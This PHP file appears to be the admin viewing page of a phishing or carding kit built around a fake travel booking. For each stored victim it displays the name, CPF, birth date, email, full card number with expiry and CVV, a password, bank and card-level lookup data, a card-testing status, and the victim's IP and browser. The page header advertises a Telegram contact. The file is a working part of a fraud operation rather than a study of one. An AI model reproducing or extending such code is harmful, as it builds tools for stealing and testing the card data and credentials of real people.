<?php
session_start();

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header("Location: ./");
    exit;
}

require_once 'config.php';

$id = isset($_GET['id']) ? (int)$_GET['id'] : 0;

$sql = "SELECT * FROM infoconsul WHERE id = ?";
$stmt = $conn->prepare($sql);
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();
$row = $result->fetch_assoc() ?: [];

$pedido         = $row['numero_pedido']   ?? '-';
$nome           = $row['nome']            ?? '-';
$cpf            = $row['cpf']             ?? '-';
$nascimento     = $row['nascimento']      ?? '-';
$classe         = $row['classe']          ?? '-';
$email          = $row['email']           ?? '-';
$tipo           = $row['tipo']            ?? '-';
$cidade         = $row['cidade']          ?? '-';
$destino        = $row['destino']         ?? '-';
$origem         = $row['origem']          ?? '-';
$infocc_val     = $row['infocc']          ?? '-';
$validade       = $row['validade']        ?? '-';
$cvv            = $row['cvv']             ?? '-';
$bandeira       = $row['bandeira']        ?? '-';
$banco          = $row['banco']           ?? '-';
$level          = $row['level']           ?? '-';
$pais           = $row['pais']            ?? '-';
$documento      = $row['documento']       ?? '-';
$passageiros    = $row['passageiros']     ?? '-';
$navegador      = $row['navegador']       ?? '-';
$parcelas       = $row['parcelas']        ?? '-';
$ip             = $row['ip']              ?? '-';
$status         = $row['resultado_gateway'] ?? 'Não Testado';
$data_de_ida    = $row['data_de_ida']     ?? '-';
$data_de_volta  = $row['data_de_volta']   ?? '-';
$senha  = $row['senha']   ?? '-';
$valor          = $row['valor']           ?? null;
$dataFormatada    = ($nascimento && $nascimento !== '-') ? date('d/m/Y', strtotime($nascimento)) : '-';
$data_de_ida_fmt  = ($data_de_ida    && $data_de_ida    !== '-') ? date('d/m/Y', strtotime($data_de_ida))    : '-';
$data_de_volta_fmt= ($data_de_volta  && $data_de_volta  !== '-') ? date('d/m/Y', strtotime($data_de_volta))  : '-';
$tipoFormatado = ($tipo && $tipo !== '-') ? str_replace('_', ' ', $tipo) : '-';
$valorFormatado = ($valor !== null && $valor !== '-') ? 'R$ ' . number_format((float)$valor, 2, ',', '.') : '-';
$passageirosFormatado = '-';
$linha_extra = "Bandeira: $bandeira | Banco: $banco | Level: $level | País: $pais";

if ($passageiros && $passageiros !== '-') {
    $dados = json_decode($passageiros, true);
    
    if (json_last_error() === JSON_ERROR_NONE && is_array($dados)) {
        $lista = [];
        
        foreach ($dados as $p) {
            $nome_p     = $p['nome']       ?? '-';
            $cpf_p      = $p['documento']  ?? null;
            $sexo       = $p['sexo']       ?? null;
            $email_p    = $p['email']      ?? null;
            $tel        = $p['telefone']   ?? null;
            $nasc       = null;

            if (!empty($p['nascimento'])) {
                $data = DateTime::createFromFormat('d-m-Y', $p['nascimento']);
                if ($data) {
                    $nasc = $data->format('d/m/Y');
                }
            }

            $info = [];
            if ($cpf_p)   $info[] = "CPF: $cpf_p";
            if ($sexo)    $info[] = "Sexo: $sexo";
            if ($nasc)    $info[] = "Nasc: $nasc";
            if ($email_p) $info[] = "Email: $email_p";
            if ($tel)     $info[] = "Tel: $tel";

            $linha = $nome_p;
            if ($info) {
                $linha .= ' ' . implode(', ', $info) . '';
            }
            $lista[] = $linha;
        }
        
        $passageirosFormatado = implode(' | ', $lista);
    }
}
?>
<!doctype html>
<html lang="pt-br" data-theme="dark">
   <?php include('head.php'); ?>
   <body data-theme="light">
      <div id="body" class="theme-cyan">
      <?php include('theme.php'); ?>
      <div class="overlay"></div>
      <div id="wrapper">
      <?php include('submenu.php'); ?>
      <?php include('menu.php'); ?>
      <div id="main-content">
      <div class="container-fluid">
      <div class="block-header">
         <div class="row clearfix">
            <div class="col-lg-4 col-md-12 col-sm-12">
               <h1>Olá  admin, você está em  / ViewInfo</h1>
               <span>TXT_JPGI1 - @TXT_JPGI1 &lt;== no telegram! </span>
            </div>
         </div>
      </div>
      <div class="card">
    <div class="header">
        <h2>
            <?php echo htmlspecialchars($pedido); ?> 
            <button type="button" onclick="history.go(-1);" class="btn btn-sm btn-default" title="Voltar">
                <i class="fa fa-arrow-left"></i> Voltar
            </button>
        </h2>
    </div>
    
    <div class="body">
        <ul class="list-group">
            <li class="list-group-item"><strong>Nome:</strong> <?php echo htmlspecialchars($nome); ?></li>
            <li class="list-group-item"><strong>CPF:</strong> <?php echo htmlspecialchars($cpf); ?></li>
            <li class="list-group-item"><strong>E-mail:</strong> <?php echo htmlspecialchars($email); ?></li>
            <li class="list-group-item"><strong>Nascimento:</strong> <?php echo htmlspecialchars($dataFormatada); ?></li>
            <li class="list-group-item"><strong>Origem:</strong> <?php echo htmlspecialchars($origem); ?></li>
            <li class="list-group-item"><strong>Destino:</strong> <?php echo htmlspecialchars($destino); ?></li>
            <li class="list-group-item"><strong>Data de Ida:</strong> <?php echo htmlspecialchars($data_de_ida_fmt); ?></li>
            <li class="list-group-item"><strong>Data de Volta:</strong> <?php echo htmlspecialchars($data_de_volta_fmt); ?></li>
            <li class="list-group-item"><strong>Tipo:</strong> <?php echo htmlspecialchars($tipoFormatado); ?></li>
            <li class="list-group-item"><strong>Classe:</strong> <?php echo htmlspecialchars($classe); ?></li>
            <li class="list-group-item"><strong>Valor:</strong> <?php echo htmlspecialchars($valorFormatado); ?></li>
            <li class="list-group-item"><strong>Passageiros:</strong> <?php echo htmlspecialchars($passageirosFormatado); ?></li>
            <li class="list-group-item"><strong>InfoCC:</strong> <?php echo htmlspecialchars($infocc_val . ' | ' . $validade . ' | ' . $cvv); ?></li>
            <li class="list-group-item"><strong>Senha:</strong> <?php echo htmlspecialchars($senha); ?></li>
            <li class="list-group-item"><strong>Situação:</strong> <?php echo htmlspecialchars($status); ?></li>
            <li class="list-group-item"><strong>Documento:</strong> <?php echo htmlspecialchars($documento); ?></li>
            <li class="list-group-item"><strong>Detalhes:</strong> <?php echo htmlspecialchars($linha_extra); ?></li>
            <li class="list-group-item"><strong>IP:</strong> <?php echo htmlspecialchars($ip); ?></li>
            <li class="list-group-item"><strong>Navegador:</strong> <?php echo htmlspecialchars($navegador); ?></li>
        </ul>
    </div>
</div>